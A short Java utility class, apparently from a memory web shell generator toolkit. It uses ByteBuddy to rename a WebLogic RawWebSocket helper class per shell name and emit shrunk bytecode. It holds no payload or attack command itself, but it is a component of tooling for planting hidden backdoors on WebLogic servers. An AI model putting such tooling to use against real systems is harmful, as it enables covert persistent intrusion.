package com.reajason.javaweb.memshell.server.weblogic;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

/**
 * 按 shell 类名派生并重命名 WebLogic RawWebSocket helper。
 *
 * @author ReaJason
 */
public class WebLogicRawWsHelperGenerator {

    private WebLogicRawWsHelperGenerator() {
    }

    public static byte[] getBytes(String helperClassName, ShellConfig shellConfig) {
        try (DynamicType.Unloaded<?> unloaded = new ByteBuddy()
                .redefine(WebLogicRawWsHelper.class)
                .name(helperClassName)
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                .make()) {
            return ClassBytesShrink.shrink(unloaded.getBytes(), shellConfig.isShrink());
        }
    }
}
